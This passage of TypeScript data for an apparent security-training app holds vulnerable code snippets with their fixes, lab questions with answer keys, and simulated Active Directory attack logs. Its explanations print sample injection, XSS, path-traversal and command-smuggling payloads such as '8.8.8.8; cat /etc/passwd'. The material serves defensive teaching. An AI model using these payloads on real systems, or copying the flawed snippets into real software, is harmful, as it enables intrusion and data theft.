];

/* ============================================================ Secure Code Review */
export type Snip = { id: string; title: string; lang: string; code: string[]; bad: number; fixes: string[]; fix: number; why: string; cwe: string };
export const REVIEW: Snip[] = [
  { id: 'sqli', title: 'Student lookup', lang: 'Python', cwe: 'CWE-89 SQL injection', bad: 5, fix: 1,
    code: ['@app.get("/students")', 'def find_student():', '    name = request.args.get("name", "")', '    cur = db.cursor()', '    cur.execute(f"SELECT * FROM students WHERE name = \'{name}\'")', '    return jsonify(cur.fetchall())'],
    fixes: ['Escape single quotes with name.replace("\'", "")', 'cur.execute("SELECT * FROM students WHERE name = %s", (name,))', 'Check that name is shorter than 50 characters'],
    why: 'User input is pasted into the SQL text, so input like \' OR \'1\'=\'1 changes the query. Parameterized queries send data separately from code. Stripping quotes is easy to bypass.' },
  { id: 'xss', title: 'Greeting page', lang: 'JavaScript', cwe: 'CWE-79 Cross-site scripting', bad: 3, fix: 2,
    code: ['app.get("/hello", (req, res) => {', '  const name = req.query.name || "friend";', '  res.send(`<h1>Hello ${name}</h1>`);', '});'],
    fixes: ['Block requests that contain the word "script"', 'Set a cookie with HttpOnly', 'Escape name for HTML (or render with a template engine that auto-escapes)'],
    why: 'A name like <img src=x onerror=alert(1)> runs in the visitor\'s browser. Encode output for the context it lands in. Word blocklists miss endless variants.' },
  { id: 'path', title: 'File download', lang: 'Python', cwe: 'CWE-22 Path traversal', bad: 4, fix: 0,
    code: ['@app.get("/download")', 'def download():', '    name = request.args["file"]', '    return send_file(os.path.join("/srv/uploads", name))'],
    fixes: ['Resolve the full path and refuse it unless it is still inside /srv/uploads', 'Make the uploads folder read-only', 'Log the file name before sending'],
    why: 'file=../../etc/passwd walks out of the folder. Canonicalize the path and check it stays inside the allowed directory (or look files up by ID).' },
  { id: 'cmd', title: 'Network check', lang: 'Python', cwe: 'CWE-78 OS command injection', bad: 3, fix: 2,
    code: ['def ping(host):', '    # host comes from a web form', '    out = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)', '    return out.stdout'],
    fixes: ['Run it with sudo so it always works', 'Remove spaces from host', 'Validate host as an IP or hostname, then subprocess.run(["ping", "-c", "1", host]) without shell=True'],
    why: 'host = "8.8.8.8; cat /etc/passwd" runs a second command. Pass an argument list without a shell, and validate the input.' },
  { id: 'secret', title: 'Cloud upload', lang: 'Python', cwe: 'CWE-798 Hard-coded credentials', bad: 3, fix: 1,
    code: ['import boto3', '', 'AWS_SECRET_ACCESS_KEY = "EXAMPLEKEY/K7MDENG/bPxRfiCYEXAMPLE"', 's3 = boto3.client("s3", aws_secret_access_key=AWS_SECRET_ACCESS_KEY)', 's3.upload_file("grades.csv", "isu-reports", "grades.csv")'],
    fixes: ['Base64-encode the key in the file', 'Use the workload\'s IAM role or a secrets manager; never commit keys. Rotate this one now.', 'Move the key into a file called config.py'],
    why: 'Anything in a repo is effectively public and lives on in git history. Encoding is not protection. Rotate leaked keys and use short-lived, role-based credentials.' },
  { id: 'hash', title: 'Sign-up', lang: 'Python', cwe: 'CWE-916 Weak password hashing', bad: 3, fix: 0,
    code: ['def register(email, password):', '    user = User(email=email)', '    user.pw = hashlib.md5(password.encode()).hexdigest()', '    db.save(user)'],
    fixes: ['Use a slow, salted password hash such as Argon2id or bcrypt', 'Use SHA-256 instead of MD5', 'Encrypt the password with AES and store the key nearby'],
    why: 'MD5 and even SHA-256 are fast, so stolen hashes are cracked by billions of guesses per second. Password hashes must be slow and salted. Encryption is reversible, which is worse.' },
  { id: 'idor', title: 'Invoice view', lang: 'JavaScript', cwe: 'CWE-639 Insecure direct object reference', bad: 3, fix: 2,
    code: ['app.get("/invoices/:id", requireLogin, async (req, res) => {', '  const invoice = await Invoice.findById(req.params.id);', '  res.json(invoice);', '});'],
    fixes: ['Use long random IDs so nobody can guess them', 'Return 404 instead of 403 for missing invoices', 'Only return the invoice if invoice.ownerId === req.user.id (or the user is staff)'],
    why: 'Being logged in is not the same as being allowed. Change id=1001 to 1002 and you see someone else\'s invoice. Check ownership on every request; random IDs only hide the bug.' },
  { id: 'pickle', title: 'Session restore', lang: 'Python', cwe: 'CWE-502 Unsafe deserialization', bad: 3, fix: 1,
    code: ['@app.post("/restore")', 'def restore():', '    state = pickle.loads(request.data)', '    session.update(state)', '    return "ok"'],
    fixes: ['Compress the data first', 'Accept JSON with json.loads and validate the fields you expect', 'Only accept requests under 1 KB'],
    why: 'pickle can run code while loading, so attacker-supplied pickle is remote code execution. Use plain data formats with a schema.' },
  { id: 'redirect', title: 'Login redirect', lang: 'Python', cwe: 'CWE-601 Open redirect', bad: 5, fix: 0,
    code: ['@app.post("/login")', 'def login():', '    if check(request.form):', '        nxt = request.args.get("next", "/")', '        return redirect(nxt)', '    return render("login.html", error=True)'],
    fixes: ['Only redirect to relative paths on this site (or an allow-list); otherwise go to "/"', 'Add a 2-second delay before redirecting', 'Require HTTPS for the next parameter'],
    why: 'A phishing link like /login?next=https://evil.example sends users from your real login page to an attacker\'s site.' },
  { id: 'jwt', title: 'API token check', lang: 'Python', cwe: 'CWE-347 Missing signature verification', bad: 3, fix: 2,
    code: ['def current_user(token):', '    # token from the Authorization header', '    claims = jwt.decode(token, options={"verify_signature": False})', '    return User.get(claims["sub"])'],
    fixes: ['Check that the token has three parts', 'Store the token in localStorage', 'jwt.decode(token, KEY, algorithms=["HS256"]) so forged tokens are rejected'],
    why: 'Without verifying the signature, anyone can write their own token and claim to be any user. Verify with the key and pin the algorithm.' },
  { id: 'iam', title: 'Cloud IAM policy', lang: 'JSON', cwe: 'Least privilege (cloud misconfiguration)', bad: 5, fix: 1,
    code: ['{', '  "Version": "2012-10-17",', '  "Statement": [{', '    "Effect": "Allow",', '    "Action": "*", "Resource": "*"', '  }]', '}'],
    fixes: ['Add a Deny statement for billing', 'Allow only the actions and resources this app needs, e.g. s3:GetObject on one bucket', 'Attach it to a group instead of a user'],
    why: 'Action * on Resource * is full admin. If this app\'s credentials leak, the whole account is gone. Grant the minimum and widen only with a reason.' },
  { id: 'sg', title: 'Firewall rule', lang: 'YAML', cwe: 'Exposed management port', bad: 6, fix: 0,
    code: ['SecurityGroup:', '  Ingress:', '    - Port: 443', '      Source: 0.0.0.0/0', '    - Port: 22', '      Source: 0.0.0.0/0'],
    fixes: ['Limit SSH to the admin VPN range or use a bastion / session manager', 'Move SSH to port 2222', 'Remove the HTTPS rule instead'],
    why: 'SSH open to the whole internet invites brute force (see the Log Hunt). Public HTTPS is expected for a website; management ports should not be. Changing the port only hides from lazy scans.' },
  // ---- Advanced
  { id: 'adv-ssrf', title: 'Link preview', lang: 'Python', cwe: 'CWE-918 Server-side request forgery', bad: 4, fix: 2,
    code: ['@app.post("/preview")', 'def preview():', '    url = request.json["url"]', '    page = requests.get(url, timeout=5)', '    return {"title": extract_title(page.text)}'],
    fixes: ['Only allow URLs that start with https://', 'Add a shorter timeout', 'Resolve the host, refuse private, loopback and link-local addresses (like 169.254.169.254), and allow only expected domains'],
    why: 'The server fetches whatever URL it is given, including internal services and the cloud metadata endpoint that hands out credentials. "https only" still allows https://internal-admin. Check where the name resolves, not just how it is spelled.' },
  { id: 'adv-race', title: 'Gift card redeem', lang: 'Python', cwe: 'CWE-362 Race condition', bad: 4, fix: 0,
    code: ['def redeem(user, card_id):', '    card = Card.get(card_id)', '    if card.used: abort(400)', '    user.balance += card.value', '    card.used = True', '    db.commit()'],
    fixes: ['Mark the card used and credit the balance in one atomic update (UPDATE ... SET used = true WHERE id = ? AND used = false) and only credit if a row changed', 'Check card.used twice', 'Add a CAPTCHA to the form'],
    why: 'Send 20 redeem requests at the same instant and many pass the "if card.used" check before any of them sets it. The check and the change must happen in one atomic step.' },
  { id: 'adv-second-order', title: 'Admin report', lang: 'Python', cwe: 'CWE-89 Second-order SQL injection', bad: 4, fix: 1,
    code: ['def activity_report(user_id):', '    user = db.execute("SELECT username FROM users WHERE id = %s", (user_id,)).one()', '    # username was stored safely at sign-up', '    rows = db.execute(f"SELECT * FROM logins WHERE username = \'{user.username}\'")', '    return render_report(rows)'],
    fixes: ['Escape the username when the user signs up', 'Parameterize this query too: db.execute("SELECT * FROM logins WHERE username = %s", (user.username,))', 'Only admins can open the report, so it is fine'],
    why: 'The first query is safe, but data that came from a user is still user data when you read it back. A username like x\' OR \'1\'=\'1 fires later, inside the admin report. Parameterize every query.' },
  { id: 'adv-mass-assign', title: 'Profile update', lang: 'Python', cwe: 'CWE-915 Mass assignment', bad: 4, fix: 2,
    code: ['@app.patch("/me")', '@login_required', 'def update_me():', '    current_user.update(**request.json)', '    db.commit()', '    return current_user.public()'],
    fixes: ['Validate that the JSON is under 1 KB', 'Log every profile change', 'Copy only allowed fields (display_name, bio) from the request; never is_admin, role or balance'],
    why: 'Send {"is_admin": true} and the model happily saves it. Accept an explicit allow-list of fields for each endpoint.' },
  { id: 'adv-alg', title: 'Token verify', lang: 'Python', cwe: 'CWE-347 Algorithm confusion', bad: 3, fix: 0,
    code: ['def verify(token):', '    header = jwt.get_unverified_header(token)', '    return jwt.decode(token, PUBLIC_KEY, algorithms=[header["alg"]])'],
    fixes: ['Pin the algorithm the server expects: algorithms=["RS256"]', 'Check that alg is not empty', 'Lower-case the alg first'],
    why: 'The attacker chooses the algorithm. With "HS256" they can sign a token using your public key as the HMAC secret; some libraries even accept "none". The server, not the token, decides the algorithm.' },
  { id: 'adv-timing', title: 'Webhook check', lang: 'Python', cwe: 'CWE-208 Timing side channel', bad: 4, fix: 1,
    code: ['def valid_webhook(req):', '    sig = req.headers.get("X-Signature", "")', '    expected = hmac.new(SECRET, req.body, "sha256").hexdigest()', '    return sig == expected'],
    fixes: ['Compare lower-case versions', 'return hmac.compare_digest(sig, expected)', 'Reject signatures shorter than 64 characters'],
    why: '== stops at the first different character, so response time leaks how many characters were right. Over many requests that can rebuild a valid signature. Constant-time comparison removes the signal.' },
];

/* ============================================================ Labs: levels and checks */
export const norm = (s: string) => s.trim().toLowerCase().replace(/\s+/g, '').replace(/^["']|["']$/g, '');
export type Level = { id: string; title: string; q: string; a: string | string[]; hints: string[]; lesson: string; start?: string };
export const PCAP_LEVELS: Level[] = [
  { id: 'dns-server', title: 'Find the DNS server', start: 'dns', q: 'Apply the filter dns. Which IP address answers the DNS queries?', a: '10.0.5.1', hints: ['Queries go to the server and responses come back from it.', 'Look at the Source column of the "response" rows.'], lesson: 'Filters cut a capture down to the conversation you care about. Start broad (a protocol), then narrow.' },
  { id: 'scanner', title: 'Spot the scanner', start: 'tcp.flags.syn == 1 && tcp.flags.ack == 0', q: 'One outside host sends SYN packets to many ports on 10.0.5.20. What is its IP?', a: '203.0.113.66', hints: ['The starting filter shows only connection attempts (SYN without ACK).', 'Which source repeats with a different destination port each time?'], lesson: 'A port scan is a burst of SYNs to many ports. Closed ports answer RST; open ones answer SYN-ACK.' },
  { id: 'open-ports', title: 'Which ports are open?', q: 'Which ports on 10.0.5.20 answered the scan with SYN-ACK? List them lowest first, separated by commas.', a: '21,22,80,445', hints: ['Filter for replies from the server: ip.src == 10.0.5.20 && ip.dst == 203.0.113.66', 'Then look for [SYN,ACK] in the Info column, or add && tcp.flags.reset == 0'], lesson: 'Open ports are the attack surface. FTP, SSH and SMB facing the internet would each need a strong reason.' },
  { id: 'ftp-user', title: 'Cleartext login', q: 'A backup script logged in to FTP. Which username did it use?', a: 'backup', hints: ['Try the filter ftp', 'Look for a USER request.'], lesson: 'FTP sends usernames and passwords in cleartext: anyone on the path sees them. Look at the PASS line too. Use SFTP or FTPS instead.' },
  { id: 'download', title: 'Suspicious download', q: 'Host 10.0.5.31 downloaded a program over plain HTTP. What is the file name?', a: 'invoice_2026.exe', hints: ['Filter http.request', 'The file name is the last part of the URI.'], lesson: 'An .exe from an invoice-themed site, over unencrypted HTTP, right after an email: a classic phishing payload.' },
  { id: 'domain', title: 'Where did it come from?', q: 'Which domain name served that download?', a: 'invoice-portal.example.net', hints: ['Check the HTTP Host header: http.host contains "invoice"', 'Or find the DNS query 10.0.5.31 made just before.'], lesson: 'DNS and HTTP Host headers tie an IP to a name. Blocking the domain and searching for other hosts that resolved it is the next SOC step.' },
  { id: 'tunnel', title: 'Data hiding in DNS', q: 'One host sends DNS TXT queries with long, random-looking names, all ending in the same domain. Which domain (the last three labels)?', a: 'cdn-sync.example.org', hints: ['Filter dns && ip.src == 10.0.5.52', 'Ignore the random first label: what do the names end with?'], lesson: 'DNS tunneling smuggles data out inside query names. Long, high-entropy labels to one rare domain are the giveaway.' },
  { id: 'arp-sweep', title: 'Rogue device', q: 'An internal device is asking for every address on the subnet. Which IP is it?', a: '10.0.5.99', hints: ['Filter arp', 'Which host sends "Who has" for many different addresses in a row?'], lesson: 'An ARP sweep maps the local network. A device you do not recognize doing it deserves a visit.' },
  // ---- Advanced
  { id: 'adv-pivot', title: 'Lateral movement', q: 'After the download, 10.0.5.31 tried admin ports on four internal servers. Which ports accepted the connection? Lowest first, comma-separated.', a: '445,3389', hints: ['Filter the replies sent back to 10.0.5.31 from 10.0.5.x servers: ip.dst == 10.0.5.31 && tcp.flags.syn == 1', 'SYN,ACK means the port is open; RST means closed.'], lesson: 'A workstation suddenly talking SMB and RDP to servers is how one infected laptop becomes a breach. Internal segmentation and alerting on new admin connections catch it.' },
  { id: 'adv-spoof', title: 'Gateway impersonation', q: 'Two different MAC addresses claim to be the gateway 10.0.5.1. What is the impostor\'s MAC?', a: '00:1a:2b:66:66:66', hints: ['arp && info contains "10.0.5.1 is at"', 'The real router answered first, earlier in the capture. Which reply came from 10.0.5.99?'], lesson: 'ARP spoofing puts the attacker in the middle of every connection on the subnet. Dynamic ARP inspection on switches stops it.' },
  { id: 'adv-beacon', title: 'Beaconing', q: 'One host keeps opening TLS connections to the same name with exactly the same packet size. Which name (SNI)?', a: 'status.cdn-check.example.com', hints: ['tls && info contains "Client Hello"', 'Look for the same length repeated: try frame.len == 233'], lesson: 'Malware checks in on a schedule with near-identical packets. Regular timing and size are a stronger signal than any single packet.' },
  { id: 'adv-exfil', title: 'How much left?', q: 'The infected host POSTed data back to the malware server. How many bytes in total (add up frame.len of those POST packets)?', a: '3901', hints: ['http.request.method == "POST" && ip.dst == 198.51.100.77', 'Click each packet to read its Length, then add them.'], lesson: 'Sizing exfiltration tells legal and leadership what might be gone. Captures give you exact numbers; flow logs give estimates.' },
  { id: 'adv-tunnel-decode', title: 'Decode the tunnel', q: 'Decode the first label of the second tunneled DNS query (it is Base64). Which file is leaving the network? Give the file name only.', a: ['usernames.csv', 'usernames.csv.part1'], hints: ['dns && ip.src == 10.0.5.52, then take the second query.', 'Copy the part before .t1. into the Crypto & Encoding Lab and use From Base64.'], lesson: 'DNS tunnels split stolen files into labels. Decoding a few tells you what was taken, which changes who you have to notify.' },
];
export const HUNT_LEVELS: Level[] = [
  { id: 'fails', title: 'Count the failures', start: 'source=auth action=failed', q: 'How many failed SSH logins are in the logs?', a: '48', hints: ['Run the starting query and read the result count.'], lesson: 'Start every hunt by measuring. One or two failures is normal; dozens is not.' },
  { id: 'top-ip', title: 'Who is guessing?', q: 'Which IP address has the most failed logins?', a: '203.0.113.66', hints: ['Add a pipe: source=auth action=failed | stats count by src_ip'], lesson: 'stats count by FIELD turns thousands of lines into a ranked list. It is the most used command in any SIEM.' },
  { id: 'breach', title: 'Did they get in?', q: 'That IP eventually logged in successfully. Which account?', a: 'deploy', hints: ['Search: src_ip=203.0.113.66 action=accepted'], lesson: 'Failures followed by a success from the same IP is the brute-force pattern that matters. Reset that account and check what it did next.' },
  { id: 'time', title: 'When?', q: 'At what time (UTC, HH:MM) did that successful login happen?', a: ['10:11', '10:11:32'], hints: ['Same search, read the time field.'], lesson: 'The first successful login time anchors the incident timeline. Everything after it is in scope.' },
  { id: 'payload', title: 'What ran?', q: 'Right after logging in, the attacker used sudo to run a script from another server. Which IP was it downloaded from?', a: '198.51.100.77', hints: ['Search: user=deploy action=sudo', 'Read the cmd field.'], lesson: 'curl | sh as root runs whatever that server sends. Block the IP, pull the script for analysis, and assume the host is compromised.' },
  { id: 'persist', title: 'Persistence', q: 'The attacker created a new user to keep access. What is its name?', a: 'sysupd', hints: ['Search: action=useradd', 'Or search the raw text: "new user"'], lesson: 'A new account with an innocent-looking name is a common way to keep access after the password is reset.' },
  { id: 'sqlmap', title: 'Web attack tool', q: 'One web client is an automated SQL injection tool. What is the tool called?', a: 'sqlmap', hints: ['source=web | stats count by ua'], lesson: 'Attack tools often announce themselves in the User-Agent. Real attackers change it, so also look at the requests themselves.' },
  { id: 'traversal', title: 'Path traversal', q: 'Which page (the path before the ?) received ../ path traversal attempts?', a: '/download.php', hints: ['Search the raw text: ../', 'Encoded versions use %2f for /.'], lesson: 'The first attempt got a 200: the server returned /etc/passwd. Check status codes to tell attempts from successes.' },
  { id: 'errors', title: 'Server errors', q: 'How many web requests returned HTTP 500?', a: '3', hints: ['source=web status=500'], lesson: 'Errors during an injection attack can mean the payload broke a query. They are worth investigating, not just fixing.' },
  // ---- Advanced
  { id: 'adv-usernames', title: 'How many guesses?', q: 'How many different usernames did 203.0.113.66 try?', a: '6', hints: ['src_ip=203.0.113.66 action=failed | stats count by user', 'Count the rows.'], lesson: 'Few usernames, many tries each is brute force. Many usernames, one try each is spraying. The shape decides the fix.' },
  { id: 'adv-webshell', title: 'Web shell', q: 'After the SQL injection, 192.0.2.150 uploaded a file and then ran commands through it. Which path did the commands go to (before the ?)?', a: '/uploads/avatar.php', hints: ['src_ip=192.0.2.150 | table time,method,path', 'Look for cmd= in the path.'], lesson: 'An "avatar" that ends in .php and takes a cmd parameter is a web shell. Uploads must be stored outside the web root and never executed.' },
  { id: 'adv-first-cmd', title: 'First command', q: 'What was the first command run through the web shell?', a: 'id', hints: ['path=/uploads/avatar.php* | head 1', 'Decode %20 as a space if needed.'], lesson: 'Attackers almost always start with id or whoami to learn which account they landed as. Alert on those commands from web server processes.' },
  { id: 'adv-return', title: 'The return visit', q: 'That night the persistence account came back. From which IP did sysupd log in?', a: '192.0.2.201', hints: ['user=sysupd action=accepted'], lesson: 'Resetting the breached password is not enough if the attacker made their own account. Hunt for every account created during the incident window.' },
  { id: 'adv-staging', title: 'Staging', q: 'sysupd packed data into a hidden archive before sending it out. What is the full path of the archive?', a: '/tmp/.c.tgz', hints: ['user=sysupd action=sudo | table time,cmd'], lesson: 'tar into a dot-file in /tmp, then curl out: collect, stage, exfiltrate. Each step is a detection opportunity.' },
];
export function cryptoLevels(): Level[] { return CRYPTO.map(c => ({ id: c.id, title: c.title, q: c.q, a: c.a, hints: c.hints, lesson: c.lesson })); }

/* ============================================================ Active Directory Lab */
export const AD_FIELDS = ['time', 'event_id', 'dc', 'user', 'src_ip', 'service', 'enc', 'preauth', 'group', 'member', 'by', 'status'];
export function adEvents(): Rec[] {
  const E: Rec[] = []; const ts = (h: number, m: number, s: number) => `2026-10-22T${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}Z`;
  const add = (o: Record<string, unknown>, raw: string) => E.push({ dc: 'DC01', ...o, raw: `${o.time} DC01 EventID=${o.event_id} ${raw}` });
  const staff = ['mlopez', 'jchen', 'akim', 'rpatel', 'sgarcia', 'tnguyen', 'bwilson', 'jperez'];
  staff.forEach((u, k) => { const ip = `10.10.20.${30 + k}`;
    add({ time: ts(7, 50 + k, 3), event_id: 4768, user: u, src_ip: ip, enc: '0x12', preauth: 2, status: '0x0' }, `Kerberos TGT requested Account=${u} Client=${ip} TicketEncryption=0x12 PreAuthType=2 Result=0x0`);
    add({ time: ts(7, 50 + k, 9), event_id: 4624, user: u, src_ip: ip, status: 'success' }, `An account was successfully logged on Account=${u} Source=${ip} LogonType=3`);
    add({ time: ts(8, 5 + k, 1), event_id: 4769, user: u, src_ip: ip, service: 'fileserver01$', enc: '0x12', status: '0x0' }, `Kerberos service ticket requested Account=${u} Service=fileserver01$ TicketEncryption=0x12`); });
  add({ time: ts(8, 30, 0), event_id: 4768, user: 'intern01', src_ip: '10.10.20.61', enc: '0x17', preauth: 0, status: '0x0' }, 'Kerberos TGT requested Account=intern01 Client=10.10.20.61 TicketEncryption=0x17 PreAuthType=0 Result=0x0');
  // Password spray: one guess per account from one workstation
  const users = ['administrator', 'mlopez', 'jchen', 'akim', 'rpatel', 'sgarcia', 'tnguyen', 'bwilson', 'kdavis', 'lmartin', 'oyoung', 'pwhite', 'qhall', 'rallen', 'sking', 'twright', 'uscott', 'vgreen', 'wbaker', 'xadams', 'jperez', 'helpdesk'];
  users.forEach((u, k) => { if (u === 'jperez') return; add({ time: ts(9, 12, k * 2), event_id: 4771, user: u, src_ip: '10.10.20.77', status: '0x18' }, `Kerberos pre-authentication failed Account=${u} Client=10.10.20.77 FailureCode=0x18`); });
  add({ time: ts(9, 12, 41), event_id: 4768, user: 'jperez', src_ip: '10.10.20.77', enc: '0x12', preauth: 2, status: '0x0' }, 'Kerberos TGT requested Account=jperez Client=10.10.20.77 TicketEncryption=0x12 PreAuthType=2 Result=0x0');
  add({ time: ts(9, 12, 44), event_id: 4624, user: 'jperez', src_ip: '10.10.20.77', status: 'success' }, 'An account was successfully logged on Account=jperez Source=10.10.20.77 LogonType=3');
  // Kerberoasting: RC4 service tickets for many SPNs
  ['svc_sql', 'svc_web', 'svc_backup', 'svc_print', 'svc_sharepoint'].forEach((svc, k) => add({ time: ts(9, 20, k * 3), event_id: 4769, user: 'jperez', src_ip: '10.10.20.77', service: svc, enc: '0x17', status: '0x0' }, `Kerberos service ticket requested Account=jperez Service=${svc} TicketEncryption=0x17`));
  // Privilege escalation, DCSync and cleanup
  add({ time: ts(10, 2, 11), event_id: 4624, user: 'svc_backup', src_ip: '10.10.20.77', status: 'success' }, 'An account was successfully logged on Account=svc_backup Source=10.10.20.77 LogonType=3');
  add({ time: ts(10, 4, 30), event_id: 4728, group: 'Domain Admins', member: 'svc_backup', by: 'svc_backup', user: 'svc_backup', src_ip: '10.10.20.77' }, 'A member was added to a security-enabled global group Group=Domain Admins Member=svc_backup SubjectAccount=svc_backup');
  add({ time: ts(10, 9, 2), event_id: 4662, user: 'svc_backup', src_ip: '10.10.20.77', status: 'DS-Replication-Get-Changes-All' }, 'An operation was performed on an object Account=svc_backup Properties={1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All');
  add({ time: ts(10, 15, 48), event_id: 1102, user: 'svc_backup', src_ip: '10.10.20.77' }, 'The audit log was cleared SubjectAccount=svc_backup');
  // ---- Advanced (these reached the SIEM even after the local log was cleared)
  add({ time: ts(10, 12, 20), event_id: 4720, user: 'it_support2', by: 'svc_backup', src_ip: '10.10.20.77', status: 'created' }, 'A user account was created NewAccount=it_support2 SubjectAccount=svc_backup');
  add({ time: ts(10, 12, 51), event_id: 4728, group: 'Domain Admins', member: 'it_support2', by: 'svc_backup', user: 'svc_backup', src_ip: '10.10.20.77' }, 'A member was added to a security-enabled global group Group=Domain Admins Member=it_support2 SubjectAccount=svc_backup');
  ['fileserver01$', 'sql01$', 'backup01$'].forEach((svc, k) => add({ time: ts(10, 30, k * 4), event_id: 4769, user: 'Administrator', src_ip: '10.10.20.77', service: svc, enc: '0x17', status: '0x0' }, `Kerberos service ticket requested Account=Administrator Service=${svc} TicketEncryption=0x17`));
  return E.sort((a, b) => String(a.time) < String(b.time) ? -1 : String(a.time) > String(b.time) ? 1 : 0);
}
export const AD_LEVELS: Level[] = [
  { id: 'spray-ip', title: 'Password spray', start: 'event_id=4771', q: 'Event 4771 means Kerberos pre-authentication failed (a wrong password). Which workstation IP caused most of them?', a: '10.10.20.77', hints: ['Add: | stats count by src_ip'], lesson: 'One source failing against many accounts is password spraying: a few common passwords tried across everyone to dodge lockouts.' },
  { id: 'spray-count', title: 'How wide?', q: 'How many different accounts did that IP try and fail on?', a: '21', hints: ['event_id=4771 src_ip=10.10.20.77 | stats count by user', 'Count the rows, or read the "result rows" number.'], lesson: 'Spraying shows one failure per account, many accounts. Brute force shows many failures on one account. The detection rules differ.' },
  { id: 'spray-win', title: 'Which password worked?', q: 'Right after the spray, one account logged on successfully from the same IP. Which one?', a: 'jperez', hints: ['src_ip=10.10.20.77 event_id=4624'], lesson: 'The account that succeeded during a spray had a weak password. Reset it, and check what it did next.' },
  { id: 'kerberoast', title: 'Kerberoasting', q: 'The attacker then requested service tickets with weak RC4 encryption so they could crack them offline. How many service tickets did jperez request with TicketEncryption 0x17?', a: '5', hints: ['event_id=4769 user=jperez enc=0x17'], lesson: 'Kerberoasting: any user can request a ticket for a service account, and RC4 (0x17) tickets crack fast offline. Use long random service passwords (or managed service accounts) and disable RC4.' },
  { id: 'escalate', title: 'Privilege escalation', q: 'A cracked service account was used to add itself to Domain Admins. Which account? (Event 4728)', a: 'svc_backup', hints: ['event_id=4728'], lesson: 'Changes to Domain Admins should page someone immediately. Very few legitimate events ever do this.' },
  { id: 'dcsync', title: 'DCSync', q: 'Event 4662 with DS-Replication-Get-Changes-All from an account that is not a domain controller means DCSync: copying every password hash. At what time (HH:MM) did it happen?', a: ['10:09', '10:09:02'], hints: ['event_id=4662'], lesson: 'DCSync abuses replication rights to pull every hash, including krbtgt. Treat it as full domain compromise: reset krbtgt twice and rebuild trust.' },
  { id: 'cleared', title: 'Covering tracks', q: 'What event ID shows the attacker cleared the security log?', a: '1102', hints: ['Search for the word: cleared'], lesson: 'Clearing logs is a loud signal, and forwarding logs to a SIEM means the evidence survives anyway.' },
  { id: 'asrep', title: 'Hidden weakness', q: 'One account requests tickets without Kerberos pre-authentication (PreAuthType 0), so anyone can request its hash. Which account?', a: 'intern01', hints: ['preauth=0'], lesson: 'Accounts with "Do not require Kerberos preauthentication" are AS-REP roastable. Turn that setting off unless something truly needs it.' },
  // ---- Advanced
  { id: 'adv-backdoor', title: 'Backdoor account', q: 'Before clearing the log, the attacker created a new account (event 4720). What is it called?', a: 'it_support2', hints: ['event_id=4720'], lesson: 'Attackers create accounts that look like IT staff. New accounts created by a service account should never happen.' },
  { id: 'adv-backdoor-group', title: 'Where did it go?', q: 'Which group was that new account added to?', a: 'Domain Admins', hints: ['member=it_support2'], lesson: 'Check every privileged group after an incident, not just the account you know about. One missed backdoor means the attacker walks back in.' },
  { id: 'adv-golden', title: 'Forged tickets', q: 'After DCSync, Administrator received service tickets from 10.10.20.77, yet Administrator never requested a TGT (event 4768) that day. Which attack does that point to? (two words)', a: ['golden ticket', 'goldenticket'], hints: ['user=Administrator | table time,event_id,src_ip,service', 'Now search event_id=4768 user=Administrator. Nothing? The TGT was made somewhere else.', 'DCSync stole the krbtgt hash, which signs every TGT.'], lesson: 'With the krbtgt hash an attacker forges TGTs for any user, offline. Recovery means resetting krbtgt twice and treating the domain as compromised.' },
];

/* ============================================================ Cloud Security Lab */
export const CLOUD: Snip[] = [
  { id: 'bucket-policy', title: 'Student records bucket', lang: 'AWS S3 bucket policy (JSON)', cwe: 'Public data exposure', bad: 5, fix: 0,
    code: ['{', '  "Statement": [{', '    "Effect": "Allow",', '    "Action": "s3:GetObject",', '    "Principal": "*",', '    "Resource": "arn:aws:s3:::isu-student-records/*"', '  }]', '}'],
    fixes: ['Remove the public statement; grant read only to the app\'s role, and keep Block Public Access on', 'Rename the bucket so it is harder to guess', 'Enable versioning on the bucket'],
    why: 'Principal "*" means anyone on the internet can download every object. Misconfigured public buckets are one of the most common cloud data breaches.' },
  { id: 'bpa', title: 'Account guard rails', lang: 'AWS S3 Block Public Access (JSON)', cwe: 'Missing guard rail', bad: 3, fix: 1,
    code: ['{', '  "BlockPublicAcls": true,', '  "BlockPublicPolicy": false,', '  "IgnorePublicAcls": true,', '  "RestrictPublicBuckets": true', '}'],
    fixes: ['Turn on bucket logging instead', 'Set BlockPublicPolicy to true at the account level', 'Set RestrictPublicBuckets to false'],
    why: 'With BlockPublicPolicy off, one careless bucket policy can make data public. Account-wide Block Public Access stops that class of mistake.' },
  { id: 'rdp', title: 'Windows server firewall', lang: 'AWS security group (YAML)', cwe: 'Exposed management port', bad: 5, fix: 2,
    code: ['WebServerSG:', '  Ingress:', '    - { Port: 443, Source: 0.0.0.0/0 }', '    - { Port: 80, Source: 0.0.0.0/0 }', '    - { Port: 3389, Source: 0.0.0.0/0 }'],
    fixes: ['Remove port 80 instead', 'Change RDP to a different port number', 'Remove public RDP; reach the server through a VPN, bastion or Session Manager'],
    why: 'RDP open to the internet is hammered by password guessing and exploits within minutes. Web ports are expected to be public; management ports are not.' },
  { id: 'rds', title: 'Grades database', lang: 'AWS RDS (JSON)', cwe: 'Database reachable from the internet', bad: 4, fix: 1,
    code: ['{', '  "DBInstanceIdentifier": "grades-db",', '  "Engine": "postgres",', '  "PubliclyAccessible": true,', '  "StorageEncrypted": true', '}'],
    fixes: ['Add a longer master password', 'Set PubliclyAccessible to false and allow only the app\'s security group', 'Turn off encryption to improve speed'],
    why: 'Databases belong in private subnets, reachable only by the app. Encryption at rest does not help if anyone can log in over the network.' },
  { id: 'trail', title: 'Audit logging', lang: 'AWS CloudTrail status (JSON)', cwe: 'Logging disabled', bad: 3, fix: 0,
    code: ['{', '  "Name": "org-trail",', '  "IsLogging": false,', '  "IsMultiRegionTrail": true,', '  "LogFileValidationEnabled": true', '}'],
    fixes: ['Turn logging back on, alert when a trail is stopped, and restrict who can call StopLogging', 'Delete the trail and create a new one each month', 'Make the trail single-region to save money'],
    why: 'Attackers often stop CloudTrail first so their actions leave no record. Without it, incident response is guesswork.' },
  { id: 'old-key', title: 'Credential report', lang: 'IAM credential report (CSV)', cwe: 'Stale long-lived credentials', bad: 4, fix: 2,
    code: ['user,mfa_active,access_key_1_active,access_key_1_age_days', 'mlopez,true,false,0', 'jchen,true,true,12', 'ci-deploy,false,true,431', 'akim,true,false,0'],
